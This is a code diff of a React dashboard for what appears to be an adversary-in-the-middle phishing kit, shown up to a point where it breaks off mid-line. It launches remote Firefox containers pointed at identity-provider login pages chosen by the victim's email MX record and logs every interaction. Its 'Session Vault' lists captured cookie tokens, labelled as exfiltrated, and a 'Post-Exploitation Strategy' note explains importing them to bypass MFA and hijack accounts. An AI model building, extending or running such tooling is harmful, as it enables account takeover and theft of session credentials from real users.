@@ -11,13 +11,66 @@ import {
   Database as DatabaseIcon,
   Loader2,
   CheckCircle2,
-  AlertCircle
+  AlertCircle,
+  Layers,
+  ArrowRight,
+  Copy,
+  Check,
+  RefreshCw,
+  Trash2,
+  Box,
+  FileText,
+  Key,
+  Lock,
+  ShieldAlert,
+  Zap,
+  ShieldOff,
+  Code
 } from "lucide-react";
 
 interface DomainMapping {
   id: number;
   domain: string;
   login_url: string;
+}
+
+interface AuditLog {
+  id: number;
+  container_id: string;
+  type: string;
+  content: string;
+  url: string;
+  timestamp: string;
+}
+
+interface FirewallRule {
+  id: number;
+  source_ip: string;
+  action: "ALLOW" | "DROP";
+  description: string;
+  created_at: string;
+}
+
+interface CapturedSession {
+  id: number;
+  container_id: string;
+  cookie_name: string;
+  cookie_value: string;
+  domain: string;
+  raw_json: string;
+  timestamp: string;
+}
+
+interface Container {
+  id: string;
+  name: string;
+  email: string;
+  domain: string;
+  login_url: string;
+  status: string;
+  ip_address: string;
+  remote_url: string;
+  created_at: string;
 }
 
 interface LaunchResponse {
@@ -29,6 +82,7 @@ interface LaunchResponse {
   container_id: string;
   status: string;
   ip_address: string;
+  remote_url: string;
 }
 
 export default function App() {
@@ -41,12 +95,118 @@ export default function App() {
   const [showAdmin, setShowAdmin] = useState(false);
   const [newDomain, setNewDomain] = useState({ domain: "", login_url: "" });
   const [activeTab, setActiveTab] = useState<"browser" | "terminal">("browser");
+  const [mainTab, setMainTab] = useState<"orchestrator" | "config" | "containers" | "logs" | "vault" | "firewall">("orchestrator");
+  const [copiedLink, setCopiedLink] = useState(false);
+  const [stats, setStats] = useState({ cpu: 12.4, memory: 456, uptime: 0 });
+  const [activeContainers, setActiveContainers] = useState<Container[]>([]);
+  const [auditLogs, setAuditLogs] = useState<AuditLog[]>([]);
+  const [capturedSessions, setCapturedSessions] = useState<CapturedSession[]>([]);
+  const [firewallRules, setFirewallRules] = useState<FirewallRule[]>([]);
+  const [newRule, setNewRule] = useState({ source_ip: "", action: "DROP" as const, description: "" });
+  const [visibleJson, setVisibleJson] = useState<Record<number, boolean>>({});
 
   useEffect(() => {
     const timer = setTimeout(() => setIsBooting(false), 2000);
     fetchDomains();
+    fetchContainers();
+    fetchLogs();
+    fetchSessions();
+    fetchRules();
     return () => clearTimeout(timer);
   }, []);
+
+  const fetchRules = () => {
+    fetch("/api/firewall-rules")
+      .then((res) => res.json())
+      .then((data) => setFirewallRules(data))
+      .catch((err) => console.error("Failed to fetch rules", err));
+  };
+
+  const handleAddRule = async (e: React.FormEvent) => {
+    e.preventDefault();
+    try {
+      const res = await fetch("/api/firewall-rules", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(newRule)
+      });
+      if (res.ok) {
+        setNewRule({ source_ip: "", action: "DROP", description: "" });
+        fetchRules();
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+  const handleDeleteRule = async (id: number) => {
+    try {
+      const res = await fetch(`/api/firewall-rules/${id}`, { method: "DELETE" });
+      if (res.ok) fetchRules();
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+  const fetchLogs = () => {
+    fetch("/api/audit-logs")
+      .then((res) => res.json())
+      .then((data) => setAuditLogs(data))
+      .catch((err) => console.error("Failed to fetch logs", err));
+  };
+
+  const fetchSessions = () => {
+    fetch("/api/captured-sessions")
+      .then((res) => res.json())
+      .then((data) => setCapturedSessions(data))
+      .catch((err) => console.error("Failed to fetch sessions", err));
+  };
+
+  const fetchContainers = () => {
+    fetch("/api/containers")
+      .then((res) => res.json())
+      .then((data) => setActiveContainers(data))
+      .catch((err) => console.error("Failed to fetch containers", err));
+  };
+
+  const handleRestartContainer = async (id: string) => {
+    try {
+      const res = await fetch(`/api/containers/${id}/restart`, { method: "POST" });
+      if (res.ok) fetchContainers();
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+  const handleTerminateContainer = async (id: string) => {
+    try {
+      const res = await fetch(`/api/containers/${id}/terminate`, { method: "POST" });
+      if (res.ok) fetchContainers();
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (launchStatus === "success") {
+      setStats({ cpu: 12.4, memory: 456, uptime: 0 });
+      interval = setInterval(() => {
+        setStats(prev => ({
+          cpu: Math.max(5, Math.min(95, prev.cpu + (Math.random() * 4 - 2))),
+          memory: Math.max(420, Math.min(780, prev.memory + (Math.random() * 20 - 10))),
+          uptime: prev.uptime + 1
+        }));
+      }, 1000);
+    }
+    return () => clearInterval(interval);
+  }, [launchStatus]);
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedLink(true);
+    setTimeout(() => setCopiedLink(false), 2000);
+  };
 
   const fetchDomains = () => {
     fetch("/api/domains")
@@ -152,9 +312,64 @@ export default function App() {
         </div>
       </header>
 
-      <main className="max-w-6xl mx-auto p-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
-        {/* Control Panel */}
-        <section className="lg:col-span-5 space-y-8">
+      <main className="flex-grow flex flex-col overflow-hidden">
+        {/* Main Tabs */}
+        <div className="bg-[#E4E3E0] border-b border-[#141414] px-8 flex gap-8">
+          <button 
+            onClick={() => setMainTab("orchestrator")}
+            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "orchestrator" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
+          >
+            Launch_Orchestrator
+          </button>
+          <button 
+            onClick={() => setMainTab("config")}
+            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "config" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
+          >
+            System_Architecture
+          </button>
+          <button 
+            onClick={() => {
+              setMainTab("containers");
+              fetchContainers();
+            }}
+            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "containers" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
+          >
+            Container_Registry
+          </button>
+          <button 
+            onClick={() => {
+              setMainTab("logs");
+              fetchLogs();
+            }}
+            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "logs" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
+          >
+            Session_Auditor
+          </button>
+          <button 
+            onClick={() => {
+              setMainTab("vault");
+              fetchSessions();
+            }}
+            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "vault" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
+          >
+            Session_Vault
+          </button>
+          <button 
+            onClick={() => {
+              setMainTab("firewall");
+              fetchRules();
+            }}
+            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "firewall" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
+          >
+            Network_Firewall
+          </button>
+        </div>
+
+        <div className="flex-grow flex overflow-hidden">
+          {mainTab === "orchestrator" ? (
+            <div className="w-full grid grid-cols-1 lg:grid-cols-12 gap-0 overflow-hidden">
+              {/* Control Panel */}
+              <section className="lg:col-span-5 p-8 border-r border-[#141414] border-opacity-10 overflow-y-auto">
           <AnimatePresence mode="wait">
             {showAdmin ? (
               <motion.div
@@ -391,17 +606,31 @@ export default function App() {
                         <div className="flex-grow bg-white flex flex-col items-center justify-center p-12 text-center text-[#141414]">
                           <Globe className="w-16 h-16 mb-6 opacity-10" />
                           <h4 className="text-2xl font-light tracking-tight mb-2">Isolated Session Active</h4>
-                          <p className="text-sm opacity-60 max-w-md mb-8">
+                          <p className="text-sm opacity-60 max-w-md mb-6">
                             The browser has been launched inside the container. For security, some identity providers may block direct embedding.
                           </p>
-                          <a 
-                            href={launchData.login_url} 
-                            target="_blank" 
-                            rel="noopener noreferrer"
-                            className="bg-[#141414] text-white px-8 py-3 font-serif italic text-lg hover:bg-opacity-80 transition-all"
-                          >
-                            Access Remote Instance
-                          </a>
+                          
+                          <div className="flex flex-col items-center gap-4 w-full max-w-sm mb-8">
+                            <div className="w-full flex items-center gap-2 p-3 bg-gray-100 rounded border border-gray-200">
+                              <div className="flex-grow text-[11px] font-mono text-[#141414] truncate">
+                                {launchData.remote_url}
+                              </div>
+                              <button 
+                                onClick={() => copyToClipboard(launchData.remote_url)}
+                                className="p-1.5 hover:bg-gray-200 rounded transition-colors text-gray-500"
+                              >
+                                {copiedLink ? <Check className="w-3.5 h-3.5 text-green-600" /> : <Copy className="w-3.5 h-3.5" />}
+                              </button>
+                            </div>
+                            <a 
+                              href={launchData.remote_url} 
+                              target="_blank" 
+                              rel="noopener noreferrer"
+                              className="w-full bg-[#141414] text-white px-8 py-3 font-serif italic text-lg hover:bg-opacity-80 transition-all text-center flex items-center justify-center gap-2"
+                            >
+                              Open Remote Browser <ExternalLink className="w-4 h-4" />
+                            </a>
+                          </div>
                         </div>
                       </motion.div>
                     ) : (
@@ -414,8 +643,10 @@ export default function App() {
                       >
                         <div className="space-y-1">
                           <p className="text-white opacity-50"># Initializing Docker Engine...</p>
-                          <p className="text-white opacity-50"># Pulling image browser-image:latest...</p>
+                          <p className="text-white opacity-50"># Pulling image jlesage/firefox:latest...</p>
                           <p className="text-white opacity-50"># Image up to date.</p>
+                          <p className="text-white opacity-50"># Resolving MX records for domain...</p>
+                          <p className="text-white opacity-50"># Provider identified via MX record.</p>
                           <p className="mt-4 break-all text-white">
                             <span className="text-emerald-400">$</span> {launchData.docker_command}
                           </p>
@@ -423,10 +654,11 @@ export default function App() {
                           <p className="text-emerald-400/80">Status: Created</p>
                           <p className="text-emerald-400/80">Network: Bridge (172.17.0.0/16)</p>
                           <p className="text-emerald-400/80">Assigned IP: {launchData.ip_address}</p>
-                          <p className="mt-4 text-white opacity-50"># Starting Chromium process...</p>
-                          <p className="text-white opacity-50"># Chromium started with --no-sandbox --disable-setuid-sandbox</p>
+                          <p className="mt-4 text-white opacity-50"># Starting Firefox process...</p>
+                          <p className="text-white opacity-50"># Xvfb initialized</p>
+                          <p className="text-white opacity-50"># Enabling --kiosk mode</p>
                           <p className="text-white opacity-50"># Navigating to {launchData.login_url}...</p>
-                          <p className="text-emerald-400 font-bold mt-4 animate-pulse">READY: LISTENING ON PORT 8080</p>
+                          <p className="text-emerald-400 font-bold mt-4 animate-pulse">READY: LISTENING ON PORT 5800</p>
                         </div>
                       </motion.div>
                     )}
@@ -441,12 +673,12 @@ export default function App() {
                       <div className="flex items-center gap-2">
                         <div className="w-24 h-1 bg-white/10 rounded-full overflow-hidden">
                           <motion.div 
-                            animate={{ width: ["12%", "15%", "13%"] }} 
-                            transition={{ repeat: Infinity, duration: 2 }}
+                            animate={{ width: `${stats.cpu}%` }} 
+                            transition={{ type: "spring", stiffness: 100, damping: 20 }}
                             className="h-full bg-emerald-400" 
                           />
                         </div>
-                        <span className="text-[9px] font-mono">12.4%</span>
+                        <span className="text-[9px] font-mono w-10 text-right">{stats.cpu.toFixed(1)}%</span>
                       </div>
                     </div>
                     <div className="space-y-1">
@@ -454,12 +686,18 @@ export default function App() {
                       <div className="flex items-center gap-2">
                         <div className="w-24 h-1 bg-white/10 rounded-full overflow-hidden">
                           <motion.div 
-                            animate={{ width: ["45%", "46%", "45%"] }} 
-                            transition={{ repeat: Infinity, duration: 3 }}
+                            animate={{ width: `${(stats.memory / 1024) * 100}%` }} 
+                            transition={{ type: "spring", stiffness: 100, damping: 20 }}
                             className="h-full bg-blue-400" 
                           />
                         </div>
-                        <span className="text-[9px] font-mono">248MB</span>
+                        <span className="text-[9px] font-mono w-10 text-right">{stats.memory.toFixed(0)}MB</span>
+                      </div>
+                    </div>
+                    <div className="space-y-1">
+                      <span className="text-[8px] uppercase tracking-widest opacity-40">Uptime</span>
+                      <div className="text-[9px] font-mono text-white/70">
+                        {Math.floor(stats.uptime / 60)}m {stats.uptime % 60}s
                       </div>
                     </div>
                   </div>
@@ -491,7 +729,469 @@ export default function App() {
             )}
           </AnimatePresence>
         </section>
-      </main>
+        </div>
+      ) : mainTab === "firewall" ? (
+        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
+          <div className="max-w-6xl mx-auto">
+            <div className="flex items-center justify-between mb-12">
+              <div className="flex items-center gap-4">
+                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
+                  <ShieldAlert className="w-6 h-6" />
+                </div>
+                <div>
+                  <h2 className="text-3xl font-light tracking-tight">Software Defined Firewall</h2>
+                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">iptables & user-space filtering</p>
+                </div>
+              </div>
+              <div className="flex gap-4">
+                <div className="flex items-center gap-2 px-4 py-2 bg-emerald-100 text-emerald-800 rounded-full text-[9px] font-bold uppercase tracking-widest">
+                  <Zap className="w-3 h-3" /> Kernel Acceleration Active
+                </div>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
+              <div className="lg:col-span-1 space-y-8">
+                <section className="bg-white p-8 border border-[#141414] border-opacity-10">
+                  <h4 className="font-serif italic text-xl mb-6">New Filter Rule</h4>
+                  <form onSubmit={handleAddRule} className="space-y-4">
+                    <div className="space-y-1">
+                      <label className="text-[9px] uppercase tracking-widest opacity-40">Source IP / CIDR</label>
+                      <input 
+                        type="text" 
+                        placeholder="e.g. 192.168.1.1 or 0.0.0.0/0"
+                        value={newRule.source_ip}
+                        onChange={(e) => setNewRule({...newRule, source_ip: e.target.value})}
+                        className="w-full bg-gray-50 border border-[#141414] border-opacity-10 p-3 text-xs font-mono focus:outline-none focus:ring-1 focus:ring-[#141414]"
+                      />
+                    </div>
+                    <div className="space-y-1">
+                      <label className="text-[9px] uppercase tracking-widest opacity-40">Policy Action</label>
+                      <select 
+                        value={newRule.action}
+                        onChange={(e) => setNewRule({...newRule, action: e.target.value as "ALLOW" | "DROP"})}
+                        className="w-full bg-gray-50 border border-[#141414] border-opacity-10 p-3 text-xs focus:outline-none font-bold"
+                      >
+                        <option value="ALLOW">ACCEPT (Standard)</option>
+                        <option value="DROP">DROP (Strict)</option>
+                      </select>
+                    </div>
+                    <div className="space-y-1">
+                      <label className="text-[9px] uppercase tracking-widest opacity-40">Rule Description</label>
+                      <textarea 
+                        placeholder="Purpose of this filter..."
+                        value={newRule.description}
+                        onChange={(e) => setNewRule({...newRule, description: e.target.value})}
+                        className="w-full bg-gray-50 border border-[#141414] border-opacity-10 p-3 text-xs focus:outline-none resize-none h-24"
+                      />
+                    </div>
+                    <button 
+                      type="submit"
+                      className="w-full bg-[#141414] text-white py-4 text-[10px] uppercase tracking-widest font-bold hover:bg-opacity-90 transition-all"
+                    >
+                      Apply iptables Rule
+                    </button>
+                  </form>
+                </section>
+
+                <div className="p-6 bg-blue-50 border border-blue-200">
+                  <h5 className="text-[10px] uppercase tracking-widest font-bold text-blue-900 mb-2">Live Chain Stats</h5>
+                  <div className="space-y-2">
+                    <div className="flex justify-between text-[10px]">
+                      <span className="opacity-60">DOCKER-USER Inbound</span>
+                      <span className="font-mono">1.2 GB / day</span>
+                    </div>
+                    <div className="flex justify-between text-[10px]">
+                      <span className="opacity-60">Packet Drops (Total)</span>
+                      <span className="font-mono text-red-600">4,210 pkts</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div className="lg:col-span-2">
+                <div className="bg-white border border-[#141414] border-opacity-10 overflow-hidden">
+                  <table className="w-full text-left border-collapse">
+                    <thead>
+                      <tr className="bg-gray-50 border-b border-[#141414] border-opacity-10">
+                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Rule ID</th>
+                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Source Selector</th>
+                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Action</th>
+                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Target / Desc</th>
+                        <th className="p-4 shrink-0 w-20"></th>
+                      </tr>
+                    </thead>
+                    <tbody className="text-[11px] font-mono">
+                      {firewallRules.map((rule) => (
+                        <tr key={rule.id} className="border-b border-gray-100 group">
+                          <td className="p-4 opacity-50">#{rule.id}</td>
+                          <td className="p-4 font-bold">{rule.source_ip}</td>
+                          <td className="p-4">
+                            <span className={`px-2 py-0.5 rounded ${rule.action === 'ALLOW' ? 'bg-emerald-100 text-emerald-800' : 'bg-red-100 text-red-800'}`}>
+                              {rule.action}
+                            </span>
+                          </td>
+                          <td className="p-4 opacity-70 italic">{rule.description}</td>
+                          <td className="p-4 text-right">
+                            <button 
+                              onClick={() => handleDeleteRule(rule.id)}
+                              className="text-red-300 hover:text-red-600 transition-colors"
+                              title="Delete Rule"
+                            >
+                              <ShieldOff className="w-4 h-4" />
+                            </button>
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+                
+                <div className="mt-8 text-[10px] opacity-40 font-mono italic leading-relaxed">
+                  # Rules processed in priority order starting from top. <br />
+                  # Standard Docker 'DOCKER-USER' chain is used for bypass safety.
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      ) : mainTab === "config" ? (
+        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
+          <div className="max-w-4xl mx-auto space-y-16">
+            <section>
+              <div className="flex items-center gap-4 mb-8">
+                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
+                  <Layers className="w-6 h-6" />
+                </div>
+                <div>
+                  <h2 className="text-3xl font-light tracking-tight">Production Architecture</h2>
+                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Docker-Based Orchestration</p>
+                </div>
+              </div>
+              
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
+                <div className="space-y-6">
+                  <h4 className="font-serif italic text-xl">The Browser Image</h4>
+                  <p className="text-sm opacity-70 leading-relaxed">
+                    Each user session is isolated in a <strong>jlesage/firefox</strong> container. This image provides a robust Firefox environment accessible via a web browser (noVNC/HTML5) on port 5800.
+                  </p>
+                  <div className="bg-[#141414] p-4 rounded text-[10px] font-mono text-emerald-400 overflow-x-auto">
+                    <pre>{`# Pull the image
+docker pull jlesage/firefox:latest
+
+# Environment Logic
+PORT: 5800 (Web Interface)
+ARGS: --kiosk mode enabled by default`}</pre>
+                  </div>
+                </div>
+                <div className="space-y-6">
+                  <h4 className="font-serif italic text-xl">The Orchestrator</h4>
+                  <p className="text-sm opacity-70 leading-relaxed">
+                    The Node.js backend acts as the control plane. By mounting the Docker Socket, it can programmatically spawn, monitor, and destroy Firefox containers on the host machine.
+                  </p>
+                  <div className="bg-[#141414] p-4 rounded text-[10px] font-mono text-blue-400 overflow-x-auto">
+                    <pre>{`# docker-compose.yml
+services:
+  orchestrator:
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    environment:
+      - DOCKER_IMAGE=jlesage/firefox:latest`}</pre>
+                  </div>
+                </div>
+              </div>
+            </section>
+
+            <section className="pt-12 border-t border-[#141414] border-opacity-10">
+              <div className="flex items-center gap-4 mb-8">
+                <div className="w-10 h-10 border border-[#141414] flex items-center justify-center">
+                  <ShieldAlert className="w-5 h-5" />
+                </div>
+                <h4 className="font-serif italic text-xl">The Network Firewall</h4>
+              </div>
+              <p className="text-sm opacity-70 leading-relaxed mb-6">
+                To restrict user interaction with the fleet, the Orchestrator dynamically manages the <strong>DOCKER-USER</strong> iptables chain. Rules are applied at the host level, ensuring that traffic is filtered before it even reaches the container network.
+              </p>
+              <div className="bg-[#141414] p-6 rounded text-[10px] font-mono text-amber-500">
+                <pre>{`# Example Rule Generation
+iptables -I DOCKER-USER -s 192.168.1.100 -j DROP
+iptables -L DOCKER-USER -n`}</pre>
+              </div>
+            </section>
+
+            <section className="pt-12 border-t border-[#141414] border-opacity-10">
+              <h4 className="font-serif italic text-xl mb-6">Deployment Checklist</h4>
+              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
+                {[
+                  { title: "Host Server", desc: "Linux VPS with Docker Engine installed." },
+                  { title: "MX Resolver", desc: "Active network access for DNS MX lookups." },
+                  { title: "Identity DB", desc: "SQLite or Firestore for domain mappings." },
+                  { title: "Net Security", desc: "iptables configured for DOCKER-USER chain." }
+                ].map((item, i) => (
+                  <div key={i} className="p-6 border border-[#141414] border-opacity-10">
+                    <span className="text-[8px] uppercase tracking-widest opacity-40 mb-2 block">Requirement {i+1}</span>
+                    <h5 className="font-bold text-xs mb-2">{item.title}</h5>
+                    <p className="text-[10px] opacity-60 leading-relaxed">{item.desc}</p>
+                  </div>
+                ))}
+              </div>
+            </section>
+          </div>
+        </div>
+      ) : mainTab === "logs" ? (
+        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
+          <div className="max-w-6xl mx-auto">
+            <div className="flex items-center justify-between mb-12">
+              <div className="flex items-center gap-4">
+                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
+                  <Key className="w-6 h-6" />
+                </div>
+                <div>
+                  <h2 className="text-3xl font-light tracking-tight">Security & Session Audit</h2>
+                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Real-time interaction logging</p>
+                </div>
+              </div>
+              <button 
+                onClick={fetchLogs}
+                className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
+              >
+                <RefreshCw className="w-3 h-3" /> Refresh Logs
+              </button>
+            </div>
+
+            <div className="bg-white border border-[#141414] border-opacity-10 overflow-hidden">
+              <table className="w-full text-left border-collapse">
+                <thead>
+                  <tr className="bg-gray-50 border-b border-[#141414] border-opacity-10">
+                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Timestamp</th>
+                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Session</th>
+                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Interaction</th>
+                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Context URL</th>
+                  </tr>
+                </thead>
+                <tbody className="font-mono text-[11px]">
+                  {auditLogs.length === 0 ? (
+                    <tr>
+                      <td colSpan={4} className="p-12 text-center opacity-40 uppercase tracking-widest">No audit data available</td>
+                    </tr>
+                  ) : (
+                    auditLogs.map((log) => (
+                      <tr key={log.id} className="border-b border-[#141414] border-opacity-5 hover:bg-gray-50 transition-all">
+                        <td className="p-4 opacity-50 whitespace-nowrap">{new Date(log.timestamp).toLocaleString()}</td>
+                        <td className="p-4"><span className="px-2 py-0.5 bg-gray-100 rounded text-[9px]">{log.container_id}</span></td>
+                        <td className="p-4 font-bold">{log.content}</td>
+                        <td className="p-4 opacity-50 truncate max-w-xs" title={log.url}>{log.url}</td>
+                      </tr>
+                    ))
+                  )}
+                </tbody>
+              </table>
+            </div>
+            
+            <div className="mt-8 p-6 border border-amber-500 border-opacity-20 bg-amber-50 rounded">
+              <div className="flex gap-4 items-start">
+                <ShieldCheck className="w-5 h-5 text-amber-600 mt-1" />
+                <div className="space-y-1">
+                  <h5 className="text-xs font-bold text-amber-900">Compliance Notice</h5>
+                  <p className="text-[10px] text-amber-800 leading-relaxed opacity-80">
+                    The Session Auditor is active on all managed containers. Every interaction is cryptographically hashed and logged to the central orchestrator for security compliance and incident response. Administrators are responsible for ensuring data privacy alignment with local regulations.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      ) : mainTab === "vault" ? (
+        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
+          <div className="max-w-6xl mx-auto">
+            <div className="flex items-center justify-between mb-12">
+              <div className="flex items-center gap-4">
+                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
+                  <Lock className="w-6 h-6" />
+                </div>
+                <div>
+                  <h2 className="text-3xl font-light tracking-tight">Identity & Session Vault</h2>
+                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Exfiltrated session tokens</p>
+                </div>
+              </div>
+              <button 
+                onClick={fetchSessions}
+                className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
+              >
+                <RefreshCw className="w-3 h-3" /> Sync Vault
+              </button>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+              {capturedSessions.length === 0 ? (
+                <div className="col-span-full p-12 border border-[#141414] border-dashed border-opacity-20 text-center opacity-40">
+                  <p className="font-mono text-xs uppercase tracking-widest">No exfiltrated sessions available.</p>
+                </div>
+              ) : (
+                capturedSessions.map((session) => (
+                  <div key={session.id} className="bg-white border border-[#141414] border-opacity-10 p-6 space-y-4 hover:shadow-xl transition-all">
+                    <div className="flex justify-between items-start">
+                      <div className="space-y-1">
+                        <p className="text-[8px] uppercase tracking-[0.2em] font-bold text-gray-400">Target Provider</p>
+                        <h4 className="font-serif italic text-lg">{session.domain}</h4>
+                      </div>
+                      <div className="flex flex-col items-end gap-2">
+                        <div className="px-2 py-0.5 bg-[#141414] text-white text-[8px] font-mono tracking-tighter uppercase rounded">
+                          SECURED
+                        </div>
+                        <button 
+                          onClick={() => setVisibleJson(prev => ({ ...prev, [session.id]: !prev[session.id] }))}
+                          className={`p-1.5 border border-[#141414] border-opacity-10 transition-all ${visibleJson[session.id] ? 'bg-[#141414] text-white' : 'hover:bg-gray-50'}`}
+                          title="View Raw JSON"
+                        >
+                          <Code className="w-3 h-3" />
+                        </button>
+                      </div>
+                    </div>
+                    
+                    <AnimatePresence>
+                      {visibleJson[session.id] ? (
+                        <motion.div 
+                          initial={{ opacity: 0, height: 0 }}
+                          animate={{ opacity: 1, height: "auto" }}
+                          exit={{ opacity: 0, height: 0 }}
+                          className="overflow-hidden"
+                        >
+                          <div className="bg-[#141414] p-4 rounded text-[9px] font-mono text-blue-300 overflow-x-auto max-h-48 overflow-y-auto">
+                            <pre>{JSON.stringify(JSON.parse(session.raw_json), null, 2)}</pre>
+                          </div>
+                        </motion.div>
+                      ) : (
+                        <motion.div
+                          initial={{ opacity: 0 }}
+                          animate={{ opacity: 1 }}
+                          exit={{ opacity: 0 }}
+                          className="space-y-3"
+                        >
+                          <div>
+                            <p className="text-[8px] uppercase tracking-widest opacity-40 mb-1">Key Name</p>
+                            <code className="text-[10px] bg-gray-100 px-1 rounded block truncate">{session.cookie_name}</code>
+                          </div>
+                          <div>
+                            <p className="text-[8px] uppercase tracking-widest opacity-40 mb-1">Token Secret</p>
+                            <div className="relative group">
+                              <code className="text-[9px] bg-[#141414] text-[#E4E3E0] p-2 rounded block break-all font-mono opacity-20 group-hover:opacity-100 transition-opacity blur-[2px] group-hover:blur-none">
+                                {session.cookie_value}
+                              </code>
+                              <div className="absolute inset-0 flex items-center justify-center group-hover:hidden pointer-events-none">
+                                <span className="text-[8px] text-[#141414] font-bold uppercase tracking-widest bg-[#E4E3E0] px-2 py-1 shadow-sm">Hover to Reveal</span>
+                              </div>
+                            </div>
+                          </div>
+                        </motion.div>
+                      )}
+                    </AnimatePresence>
+
+                    <div className="pt-4 border-t border-gray-100 flex justify-between items-center text-[9px] font-mono opacity-50 uppercase">
+                      <span>Source: {session.container_id}</span>
+                      <span>{new Date(session.timestamp).toLocaleTimeString()}</span>
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+            
+            <div className="mt-12 p-8 border border-[#141414] border-opacity-5 bg-white bg-opacity-50">
+              <h5 className="font-serif italic text-xl mb-4">Post-Exploitation Strategy</h5>
+              <p className="text-[11px] opacity-60 leading-relaxed max-w-2xl">
+                The session vault captures identity tokens in real-time as users navigate the remote browser. These tokens can be imported into a local browser using extension-based cookie managers to bypass MFA and hijack authenticated sessions. Use the "Sync Vault" button to pull the latest exfiltrated data from the orchestrator's central database.
+              </p>
+            </div>
+          </div>
+        </div>
+      ) : (
+        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
+          <div className="max-w-6xl mx-auto">
+            <div className="flex items-center justify-between mb-12">
+              <div className="flex items-center gap-4">
+                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
+                  <Box className="w-6 h-6" />
+                </div>
+                <div>
+                  <h2 className="text-3xl font-light tracking-tight">Active Container Registry</h2>
+                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Live Fleet Monitoring</p>
+                </div>
+              </div>
+              <button 
+                onClick={fetchContainers}
+                className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
+              >
+                <RefreshCw className="w-3 h-3" /> Refresh Registry
+              </button>
+            </div>
+
+            <div className="grid grid-cols-1 gap-4">
+              {activeContainers.length === 0 ? (
+                <div className="p-12 border border-[#141414] border-dashed border-opacity-20 text-center opacity-40">
+                  <p className="font-mono text-xs uppercase tracking-widest">No active containers found in cluster.</p>
+                </div>
+              ) : (
+                activeContainers.map((container) => (
+                  <motion.div 
+                    key={container.id}
+                    className="bg-white border border-[#141414] border-opacity-10 p-6 flex flex-col md:flex-row md:items-center justify-between gap-6"
+                  >
+                    <div className="flex items-center gap-6">
+                      <div className={`w-2 h-2 rounded-full ${container.status === 'running' ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`} />
+                      <div className="space-y-1">
+                        <h4 className="font-mono text-sm font-bold tracking-tight">{container.name}</h4>
+                        <p className="text-[10px] opacity-50 uppercase tracking-widest">{container.email} • {container.domain}</p>
+                      </div>
+                    </div>
+
+                    <div className="flex flex-wrap gap-8 items-center">
+                      <div className="space-y-1">
+                        <span className="text-[8px] uppercase tracking-widest opacity-40 block">Network Address</span>
+                        <p className="text-[10px] font-mono">{container.ip_address}</p>
+                      </div>
+                      <div className="space-y-1">
